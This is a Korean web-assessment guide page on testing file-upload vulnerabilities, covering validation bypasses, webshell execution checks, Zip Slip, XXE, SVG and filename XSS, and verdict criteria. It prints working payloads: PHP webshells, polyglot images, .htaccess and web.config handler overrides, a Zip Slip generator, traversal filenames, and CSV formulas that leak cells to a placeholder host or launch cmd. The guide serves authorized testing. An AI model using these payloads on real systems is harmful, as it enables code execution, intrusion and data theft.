---
sidebar_position: 24
title: 파일 업로드
description: 웹 진단 - 파일 업로드 점검 절차, 확장자·MIME·Magic byte·파일명 우회, 스택별 실행과 판정 기준
keywords: [File Upload, Webshell, 웹쉘, 확장자 우회, Polyglot, Zip Slip, Stored XSS, SVG, XXE, CSV Injection, Formula Injection, web.config, JSP, ASPX]
draft: false
toc_max_heading_level: 3
---

> 업로드 파일이 검증·격리 없이 저장·서빙되어 **웹쉘(RCE) / Stored XSS / 임의 위치 파일 쓰기**로 이어지는 취약점.
> 업로드 성공만 보지 말고 저장 위치와 실제 실행 여부까지 확인한다.

## 점검 목적

업로드 기능에서 **확장자 / Content-Type / Magic byte / 파일명 / 저장 경로 / 실행 가능성**이 통제되는지 확인한다. 검증기와 웹서버가 파일을 다르게 해석하면 웹쉘 실행, SVG Stored XSS, 파일명 Path Traversal로 이어진다.

---

## 유형 구분

| 유형 | 특징 | 실무 판단 |
| :--- | :--- | :--- |
| **웹쉘 업로드 → RCE** | 확장자/MIME/Magic byte 검증 우회 + 실행 가능 디렉토리 저장 | 직접 호출 시 명령 실행되면 RCE |
| **파일명 Path Traversal** | 파일명에 `../` 포함 → 임의 디렉토리 저장/덮어쓰기 | 웹 루트에 쓰이면 RCE 가능 |
| **파일명 Stored XSS** | 파일명에 `<script>` 등 → 게시판/관리자 페이지에서 출력 시 발현 | 목록 페이지에서 파일명이 미인코딩 출력될 때만 유효 |
| **HTML/SVG 업로드 → Stored XSS** | same-origin에서 active content로 렌더링될 때 JS 실행 | 직접 URL·`object`·`iframe` 등 실제 노출 방식 확인 |
| **압축 파일 — Zip Slip** | ZIP 항목명에 `../` 포함 → 자동 해제 시 임의 위치 쓰기 | 자동 해제 기능이 있을 때만. 임의 위치 쓰기로 RCE 가능 |
| **CSV/Excel — Formula Injection** | 업로드·입력 데이터가 CSV/Excel로 다시 export될 때 수식으로 보존 | 서버가 아니라 파일을 여는 클라이언트에서 발현. 실제 export 흐름 필요 |
| **XML 기반 포맷 — XXE** | SVG/DOCX/XLSX/PPTX 등 XML을 서버가 파싱 → 외부 엔티티로 파일 읽기·SSRF | 서버 파싱 단계 공격. 파일 읽기·내부망 SSRF로 확장 |
| **처리 라이브러리 CVE** | ImageMagick, Ghostscript 등 파일 처리기 취약점 | 제품·버전이 식별된 경우에만 확인 |

---

## 진단 절차

#### Step 1. 진입점 식별

업로드가 발생하는 모든 기능을 후보로:

- 프로필 사진 / 아바타
- 게시판 첨부파일, 댓글 이미지, 마크다운 에디터 이미지 첨부
- 문서 / 이미지 업로드 (워드 첨부, 명함 등록 등)
- CSV / Excel **import**
- 압축 파일(ZIP/TAR) 업로드 + **자동 해제** 기능
- 백업 파일 **복원** 기능

#### Step 2. 검증 메커니즘 식별

정상 파일과 차단되는 파일을 비교하면서 **어디서 검증되는지** 파악:

| 검증 위치 | 식별 방법 | 우회 난이도 |
| :--- | :--- | :--- |
| 클라이언트 (HTML `accept=`, JS) | Burp Repeater로 직접 보내면 통과 | 낮음 — 본문 직접 전송 |
| 서버 — 확장자 블랙리스트 | `.php` 차단되지만 `.phtml` 통과 | 낮음 — 대체 확장자·대소문자 |
| 서버 — 확장자 화이트리스트 | 화이트리스트 외 모두 차단 | 높음 — 이중 확장자·MIME 위조·핸들러 등록 |
| 서버 — Content-Type만 검증 | 헤더 변조 시 통과 | 낮음 — multipart 헤더만 위조 |
| 서버 — Magic byte (시그니처) | 첫 바이트만 보면 Polyglot 가능 | 중간 — Polyglot·EXIF 삽입 |
| 서버 — 이미지 디코딩 | 크기·픽셀 확인 또는 재인코딩 | 중간~높음 — 처리 전후 파일과 메타데이터 비교 |

#### Step 3. 우회 시도

식별된 검증에 맞춰 아래 페이로드 노트의 해당 우회를 시도.

#### Step 4. 저장 위치 / 접근 가능성 확인

업로드만 되고 끝이 아니라, **공격자가 그 파일에 도달 가능한지** 확인:

- 업로드 응답에 파일 경로가 노출되는가? (`{"url": "/uploads/abc.php"}`)
- 응답에 경로가 없어도 추측 가능한 위치인가? (`/uploads/<원본 파일명>`, `/files/<userId>/<filename>`)
- 직접 URL 호출 시 **서버에서 실행되는가**, 단순 다운로드되는가? (Content-Type, X-Content-Type-Options)
- 별도 도메인/CDN에서 서빙되는가? (영향도 차이)
- 썸네일 생성, OCR, 압축 해제, 문서 변환 등 **어떤 후처리기**가 파일을 읽는가?

**실행 vs 다운로드 판정** — 웹쉘 업로드가 성공해도 실제 위험은 그 파일이 *실행*되는지에 달려 있다. 응답 헤더로 구분:

| 관찰 | 해석 | 판단 |
| :--- | :--- | :--- |
| 응답에 코드가 그대로 텍스트로 노출 | 서버가 실행 안 함 (핸들러 미등록) | 확장자/경로 다시 시도 |
| `?cmd=` 결과가 응답에 출력 | 서버에서 실행됨 | RCE 확정 |
| `Content-Disposition: attachment` 강제 | 브라우저 인라인 렌더링 억제 | XSS 가능성 낮음, 악성 파일 배포·권한 문제는 별도 |
| `X-Content-Type-Options: nosniff` + 비활성 MIME | MIME sniffing 억제 | 단독 방어는 부족, 렌더링 방식 함께 확인 |
| 쿠키 없는 별도 origin/CDN에서 서빙 | 앱 origin과 실행 컨텍스트 분리 | 앱 세션 대상 XSS 영향이 크게 낮아짐 |

#### Step 5. 영향 입증

- 웹쉘: 직접 호출 → `?cmd=id` 응답에 명령 결과 출력
- HTML/SVG XSS: same-origin 직접 탐색·`object`·`iframe` 등 실제 서비스 렌더링 흐름에서 JS 실행 또는 안전한 콜백 확인
- Path Traversal: 고유한 marker 파일이 의도하지 않은 디렉토리에 생성되는지 확인

---

## 페이로드 노트

### 1. 클라이언트 검증만 우회

**언제 쓰는지**: 가장 흔한 케이스. HTML `<input accept="image/*">` 또는 JS validation만 적용된 폼은 Burp로 즉시 우회.

```text
1. 정상 이미지(.jpg) 업로드 → Burp에서 인터셉트
2. 멀티파트 본문의 filename을 shell.php 로 변경
3. 본문(이미지 바이트) 을 PHP 코드로 교체
4. Forward
```

**판정**: 서버가 변조 요청을 수락하면 클라이언트 검증 우회는 확인된다. 이후 저장 위치와 실행 여부를 확인한다.

### 2. 확장자 화이트/블랙리스트 우회

**언제 쓰는지**: 서버에서 `.php` 가 명확히 차단되지만 다른 변형이 통과될 가능성이 있을 때.

```text
# 대소문자
shell.PhP
shell.PHP

# 이중 확장자
shell.php.jpg
shell.jpg.php

# URL encoding / double decoding 차이
shell%2Ephp
shell%252Ephp

# 특수 PHP 확장자
shell.phtml
shell.phar
shell.pht
shell.php5
shell.php7
shell.phps

# Trailing 점/공백
shell.php.
shell.php (공백)

# 제거 로직이 1회만 동작할 때
shell.p.phphp

# 구형 IIS·레거시 파서 후보
shell.asp;.jpg

# Apache .htaccess 업로드로 임의 핸들러 추가
.htaccess 업로드:
  AddType application/x-httpd-php .jpg
→ shell.jpg (PHP 코드 포함) 가 PHP로 실행됨
```

**스택별 실행 후보** — 아래 목록은 “그 확장자면 항상 실행된다”는 뜻이 아니다. 대상의 웹서버·서블릿 매핑·application pool·CGI 설정을 먼저 식별하고, 정상 요청에서 확인한 핸들러 범위 안에서만 선택한다.

| 스택 / 웹서버 | 실행 확장자 | 핸들러 우회 트릭 |
| :--- | :--- | :--- |
| PHP / Apache·Nginx | `.php`, 환경별 `.phtml .pht .php5 .phar` | Apache `.htaccess`, Nginx/PHP-FPM path-info 오해석 여부 |
| JSP / Tomcat·JBoss·Jetty | `.jsp .jspx`, 환경별 커스텀 매핑 | 서블릿 매핑과 실행 가능한 webapp 경로인지 확인 |
| Classic ASP / IIS | `.asp`, 레거시 환경의 `.asa .cer` | ASP Role Service·handler 활성화와 IIS 버전 의존 |
| ASP.NET / IIS | `.aspx .ashx .asmx`, 애플리케이션별 매핑 | **`web.config` 업로드**로 handler override 가능한지 확인 |
| ColdFusion | `.cfm .cfml .cfc` | ColdFusion 매핑이 해당 경로에 적용되는지 확인 |
| Perl / CGI | `.pl .cgi` | CGI가 허용된 디렉토리와 실행 권한 필요 |

#### 파일명 파서 차이

앞단 검사와 실제 저장기가 파일명을 다르게 해석하는지 비교한다.

| 방향 | 예시 |
| :--- | :--- |
| `filename` / `filename*` 차이 | `filename="safe.jpg"; filename*=UTF-8''shell%2Ephp` |
| 중복 값 | `filename="safe.jpg"; filename="shell.php"` |
| Encoding 횟수 | `shell%2Ephp`, `shell%252Ephp` |
| 1회 치환 | `shell.p.phphp` → `shell.php` |
| Trailing 문자 | `shell.php%20`, `shell.php.`, `shell.php/` |

세미콜론·NTFS ADS·8.3 short name은 레거시 Windows/IIS에서만 별도로 시도한다.

**판정**: 위 변형 중 하나가 업로드 성공 + 직접 호출 시 대상 스택으로 실행되면 취약.

> Null byte 파일명(`shell.php%00.jpg`) 은 PHP 5.3.4(2010) 이후 거의 안 통함. 옛날 시스템에서만 시도.

#### .htaccess 핸들러 오버라이드 (Apache)

`.php`가 화이트리스트로 막혀도, 업로드 디렉토리에 `.htaccess`를 올릴 수 있으면 **어떤 확장자를 PHP로 실행할지 규칙 자체를 심는다**. `.htaccess`는 확장자 없는 파일이라 확장자 검사를 그냥 통과하는 경우가 많다.

전제 조건 (모두 충족해야 함):

- 대상이 **Apache** (Nginx·IIS는 `.htaccess`를 안 읽음 → IIS는 위 `web.config`)
- `AllowOverride`가 `None`이 아님 (`FileInfo` 이상)
- 업로드 파일과 `.htaccess`가 **같은(또는 상위) 디렉토리**에 저장되고, 그 경로에서 PHP 실행이 살아 있음
- `.htaccess` 파일명 업로드가 차단되지 않음

진행 순서:

```text
1. .htaccess 업로드 (지정 확장자를 PHP 핸들러로 매핑)
2. shell.jpg 업로드 (PHP 코드 포함, 확장자는 .htaccess에서 지정한 것)
3. /uploads/shell.jpg?cmd=id 직접 호출 → 명령 결과 확인
```

`.htaccess` 지시어는 환경에 따라 먹는 게 다르므로 위→아래 순으로 시도:

```apache
# mod_php 계열
AddType application/x-httpd-php .jpg

# 더 확실 (버전 무관)
AddHandler application/x-httpd-php .jpg

# FPM/최신 환경
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**판정**: `.htaccess` + 지정 확장자 웹쉘 업로드 성공 후 직접 호출 시 명령 실행되면 취약(RCE). `.htaccess`는 올라갔지만 웹쉘이 텍스트로만 노출되면 `AllowOverride` 비활성, 허용 directive class 불일치, 또는 적용 범위 밖일 수 있다.

#### web.config 핸들러 등록 (IIS)

IIS에서 `web.config` 업로드가 가능하고 `<handlers>` override가 허용되면 임의 확장자를 기존 스크립트 엔진에 연결할 수 있다.

```xml
<?xml version="1.0"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script">
      <add name="upload-poc"
           path="*.rce"
           verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified"
           requireAccess="Script" />
    </handlers>
  </system.webServer>
</configuration>
```

```text
1. web.config 업로드
2. Classic ASP 코드가 든 shell.rce 업로드
3. /uploads/shell.rce?cmd=whoami 호출
```

**판정**: 지정 파일이 실행되면 RCE. `500`이면 section lock, Classic ASP 미설치, application pool bitness 불일치 등을 의심한다.

### 3. Content-Type 헤더만 검증

**언제 쓰는지**: 서버가 multipart의 `Content-Type` 헤더만 보고 판단할 때. Burp에서 헤더만 변조하면 통과.

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg     ← 헤더만 image/jpeg로, 본문은 PHP 코드

<?php system($_GET['cmd']); ?>
------X--
```

**판정**: 업로드 성공 + 직접 호출 시 PHP 실행되면 Content-Type만 검증 = 취약.

### 4. Magic byte / 이미지 파서 우회

**언제 쓰는지**: 서버가 파일의 첫 바이트만 검사하거나, 이미지 메타데이터를 보존한 채 원본을 저장할 때. “시그니처만 확인”, “이미지 디코딩”, “재인코딩 후 저장”을 서로 구분한다.

**GIF + PHP:**

```text
GIF89a;
<?php system($_GET['cmd']); ?>
```

이 값은 간단한 signature 검사 후보일 뿐 정상 이미지 디코딩까지 보장하지 않는다. 크기·픽셀 검증이 있으면 실제 정상 이미지를 기반으로 만든다.

**JPEG + PHP** (실제 JPEG 헤더 바이트 + EXIF 주석에 PHP 코드 삽입 — `exiftool` 활용):

```bash
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" cat.jpg
mv cat.jpg shell.php.jpg     # 이중 확장자 케이스와 결합
```

업로드 후 원본과 내려받은 파일의 hash·EXIF를 비교한다. 서버가 이미지를 다시 디코딩하고 새 파일로 저장하면 메타데이터·후행 payload가 사라질 수 있다. 반대로 원본과 썸네일이 함께 남으면 원본 URL과 변환 파일 URL을 각각 확인한다.

**판정**: 변형 파일이 통과한 것만으로는 후보이다. 코드 실행 또는 파일 처리기 취약점이 실제 발현되어야 영향이 확정된다.

### 5. 파일명 Path Traversal

**언제 쓰는지**: 서버가 multipart의 `filename` 을 그대로 저장 경로에 사용할 때.

```http
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
```

```http
Content-Disposition: form-data; name="file"; filename="..\..\..\Windows\Temp\shell.aspx"
```

```http
Content-Disposition: form-data; name="file"; filename*=UTF-8''..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php
```

```text
..%2f..%2f..%2fshell.php
..%252f..%252f..%252fshell.php
..%5c..%5c..%5cshell.aspx
/var/www/html/shell.php
C:\inetpub\wwwroot\shell.aspx
```

애플리케이션이 `basename()` 또는 유사 처리를 한다면 separator, URL decoding 횟수, Unicode normalization, Windows drive/UNC 처리 순서를 비교한다. 원본 파일 덮어쓰기는 서비스 장애를 만들 수 있으므로 고유한 PoC 파일명으로 먼저 임의 위치 쓰기만 확인한다.

**판정**: 응답에 저장 경로가 노출되거나, 의도하지 않은 위치(웹 루트 등)에서 파일 호출 시 응답되면 취약. **임의 파일 덮어쓰기**로 기존 파일 변조 가능성도 확인.

### 6. 파일명 Stored XSS

**언제 쓰는지**: 게시판/관리자 페이지에서 업로드된 파일 목록을 표시할 때, 파일명이 인코딩 없이 출력되는 경우.

```text
파일명: <img src=x onerror=alert(document.cookie)>.jpg
파일명: "><svg onload=alert(1)>.png
```

**판정**: 업로드 후 게시판/관리자 페이지에서 해당 파일명이 출력되는 페이지 열람 시 JS 실행되면 취약. XSS 페이지의 Stored XSS 판정 흐름과 동일하게 확인.

### 7. HTML / SVG 업로드 → Stored XSS

**언제 쓰는지**: HTML 또는 SVG가 업로드되고 브라우저가 이를 active content로 렌더링할 때. 확장자 허용만 보지 말고 최종 `Content-Type`, `Content-Disposition`, origin, CSP, 삽입 태그를 함께 확인한다.

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script type="text/javascript">
    fetch('https://<COLLAB>/?poc=svg');
  </script>
</svg>
```

`<img>`로만 삽입되면 보통 script가 실행되지 않는다. 직접 URL, `<object>`, `<iframe>` 등 실제 서비스 노출 방식에서 확인한다.

**판정**: 다른 사용자가 same-origin에서 파일을 열었을 때 JS 또는 안전한 OOB 콜백이 발생하면 취약. 별도 origin이나 attachment로만 제공되면 영향이 낮다.

### 8. Zip Slip — 압축 파일 자동 해제

**언제 쓰는지**: ZIP/TAR 업로드 후 서버가 **자동으로 압축 해제**하는 기능이 있을 때 (백업 복원, 테마·플러그인 업로드, 일괄 import 등).

**페이로드 ZIP 생성:**

```bash
# shell.php 준비
echo '<?php system($_GET["c"]); ?>' > shell.php

# ZIP 내부 항목명에 traversal 포함시키기
python3 -c "
import zipfile
z = zipfile.ZipFile('payload.zip', 'w')
z.write('shell.php', '../../../../var/www/html/shell.php')
z.close()
"
```

**판정**: 업로드 + 자동 해제 후 `<TARGET>/shell.php?c=id` 응답에 명령 결과가 출력되면 RCE. 기존 파일 덮어쓰기 대신 고유한 PoC 파일명을 사용한다.

ZIP뿐 아니라 TAR, 절대 경로, Windows separator, symlink entry도 해제 구현에 따라 함께 확인한다.

### 9. CSV / Excel Formula Injection

**언제 쓰는지**: CSV/Excel import 데이터나 일반 사용자 입력이 나중에 **CSV/Excel로 export** 되어 관리자·타 사용자가 여는 흐름. 업로드한 CSV를 서버가 단순 저장만 한다면 Formula Injection이 아니라 악성 파일 배포 문제다. 서버가 아니라 **파일을 여는 클라이언트**에서 발현되는 것이 핵심이다.

```text
# Google Sheets 계열
=IMPORTXML("https://<COLLAB>/?d="&A1, "//a")

# Excel 계열. 버전·Trust Center·Protected View에 따라 차단 가능
=WEBSERVICE("https://<COLLAB>/?leak="&A2)
=HYPERLINK("https://<COLLAB>/?c="&A1,"click")

# 로컬 명령 실행 (구버전 Excel / 보안경고 무시 시)
=cmd|'/c calc'!A1
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!A1

# 셀 경계·정규화 우회 후보
=1+1
=+1+1
@SUM(1+1)
<TAB>=1+1
<CR>=1+1
```

**판정**: 공격자 입력이 export된 셀의 시작 위치에 수식으로 보존되고 대상 클라이언트가 실제로 평가하면 취약. CSV 구분자(`,`, `;`, tab)나 따옴표 뒤에 새 셀이 시작되는 경우까지 확인한다. DDE·외부 함수·링크 실행은 제품·버전·보안 설정에 크게 의존하므로 실제 대상 클라이언트에서 분리 판정한다.

### 10. XML 기반 포맷 업로드 → XXE

**언제 쓰는지**: 업로드된 XML을 서버가 파싱하는 경우. SVG 외에도 DOCX/XLSX/PPTX(내부가 ZIP+XML), `.xml`, RSS/SAML/설정 파일 import가 대상. 외부 엔티티가 비활성화되지 않은 파서면 파일 읽기·SSRF로 이어진다. 앞의 SVG XSS(7번)가 브라우저 실행이라면, XXE는 **서버 파싱** 단계 공격이라 구분한다.

이미지·문서 업로드 폼은 XXE의 흔한 진입점이므로 후보로 항상 확인한다. 페이로드 문법, Blind/OOB DTD, Office 포맷 재압축 절차, 판정 기준은 [XXE 문서](./xxe.md)에서 다룬다. 여기서는 "이 업로드가 XML 파서를 지나가는가"만 판단하고, 통과하면 XXE 문서로 넘어간다.

### 11. 업로드 + LFI / Include 체인

업로드 디렉토리가 실행 불가여도 다른 기능이 해당 파일을 **include**하면 코드 실행으로 이어질 수 있다. 정상 이미지의 EXIF·후행 데이터·세션 파일·로그 등 서버가 보존한 위치를 먼저 찾는다.

```text
1. 코드 marker가 포함된 정상 이미지 업로드
2. 다운로드한 원본에서 marker 보존 여부 확인
3. LFI 파라미터로 업로드 파일의 실제 서버 경로 include
4. 단순 파일 읽기인지, 대상 인터프리터가 코드를 평가하는지 구분
```

PHP `include()` 체인은 업로드 파일 확장자가 `.jpg`여도 파일 내용의 PHP tag를 평가할 수 있다. 반면 일반적인 Java/Node/Python 정적 파일 서빙은 업로드한 `.jsp`·`.js`·`.py`를 자동 실행하지 않는다. 경로 탐색과 wrapper·로그·세션 체인은 [LFI 문서](./lfi.md)에서 이어간다.

### 12. 처리 라이브러리 확인

- ImageMagick, Ghostscript, FFmpeg 등 서버가 실제 사용하는 처리기와 버전을 확인한다.
- 제품·버전이 식별된 경우에만 해당 CVE·payload를 적용한다.
- XML·Office 포맷은 서버가 실제 파싱할 때 XXE 문서로 이어간다.

---

## 우회 매트릭스

차단되는 지점(검증 위치)을 먼저 파악하고, 그 증상에 맞는 우회 방향 한 계열씩 비교한다.

| 검증 증상 | 우회 방향 | 예시 |
| :--- | :--- | :--- |
| 클라이언트(`accept=`/JS)만 검증 | Burp로 본문 직접 전송 | filename·본문을 서버 전송 단계에서 교체 |
| 확장자 블랙리스트 | 대소문자, 대체 확장자, 스택 전환 | `shell.PhP`, `.phtml .php5 .jspx .asp .cer` |
| 확장자 화이트리스트 | 이중 확장자, trailing 문자, 핸들러 등록 | `shell.jpg.php`, `shell.php.`, `.htaccess`/`web.config` |
| 검증기와 저장기가 다른 파일명을 사용 | `filename`/`filename*`, 중복 값, decoding 차이 | `filename*=UTF-8''shell%2Ephp` |
| 위험 확장자를 문자열 치환 | 중첩 확장자, 길이 truncation | `shell.p.phphp`, 긴 이름 뒤 `.php.jpg` |
| Content-Type 헤더만 검증 | multipart 헤더만 위조 | `Content-Type: image/jpeg` + 본문은 코드 |
| Magic byte만 검증 | Polyglot, EXIF 삽입 | `GIF89a;` + 코드, `exiftool -Comment` |
| 이미지 디코딩·재인코딩 | 처리 전후 원본·썸네일 분리 확인 | hash·metadata·후행 데이터 보존 여부 |
| 파일명 정규화 없음 | traversal·절대 경로·encoded separator | `filename*=UTF-8''..%2F..%2Fshell.php` |
| 파일명 출력 시 인코딩 없음 | HTML 페이로드 파일명 | `"><svg onload=alert(1)>.png` |
| HTML/SVG가 active content로 서빙 | script/event handler | same-origin 직접 탐색·`object`·`iframe` |
| 서버가 XML 파싱 | 외부 엔티티(XXE) | SVG/DOCX 내 DOCTYPE + `SYSTEM "file:///"` |
| CSV/Excel export에 원문 반영 | 셀 수식 접두·새 셀 경계 | `=`, `+`, `@`, tab, CR |
| ZIP 자동 해제 | 항목명 traversal(Zip Slip) | 항목명 `../../../var/www/html/shell.php` |
| 실행 불가 업로드 경로 | LFI/include 또는 자동 배포와 체인 | 이미지 metadata + PHP `include()` |
| 랜덤 재명명 + 인덱스 차단 | 경로 노출·추측 지점 탐색 | 업로드 응답의 `url`/`path`, 순차 ID |

---

## 취약 판정 기준

### 취약 확정

다음 중 하나라도 재현되면 해당 영향으로 취약 판정한다.

- [ ] 업로드 파일을 직접 호출하거나 include해 **서버 측 명령 실행**
- [ ] HTML/SVG가 실제 서비스의 same-origin 렌더링 흐름에서 **다른 사용자 세션으로 JS 실행 또는 안전한 OOB 콜백**
- [ ] 파일명에 `../` 포함 시 **의도하지 않은 디렉토리에 저장**
- [ ] ZIP 자동 해제 시 traversal 항목으로 **임의 위치에 파일 생성**
- [ ] 파일명에 HTML 페이로드 포함 시 **목록 페이지에서 JS 실행**
- [ ] XML 기반 포맷(SVG/DOCX 등) 업로드 후 **XXE로 파일 읽기 또는 Collaborator 콜백**
- [ ] export CSV/Excel에서 공격자 입력이 **수식으로 평가되어** 외부 요청·링크·기타 영향 발생

### 후보 / 보류

- [ ] 위험 확장자·polyglot이 수락되었지만 실행·렌더링·외부 접근이 확인되지 않음
- [ ] `web.config`·`.htaccess`가 저장되었지만 설정이 적용되지 않고 서비스 동작도 변하지 않음
- [ ] SVG가 쿠키 없는 별도 origin에서 attachment 또는 비활성 컨텍스트로만 제공됨
- [ ] CSV 셀에 `=`가 남지만 대상 제품·설정에서 수식으로 평가되지 않음

---

## 참고자료

### 공식 및 테스트 가이드

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP WSTG - Test Upload of Unexpected File Types](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types)
- [OWASP WSTG - Test Upload of Malicious Files](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)
- [PortSwigger - File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [Apache HTTP Server - AllowOverride](https://httpd.apache.org/docs/2.4/mod/core.html#allowoverride)
- [Microsoft Learn - IIS Handler Mappings](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/handlers/)
- [Microsoft Learn - IIS Configuration Locking](https://learn.microsoft.com/en-us/iis/get-started/planning-for-security/how-to-use-locking-in-iis-configuration)
- [OWASP - CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)

### 커뮤니티 참고 / 도구

- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [HackTricks - File Upload](https://hacktricks.wiki/en/pentesting-web/file-upload/index.html)
- [Snyk - Zip Slip Vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
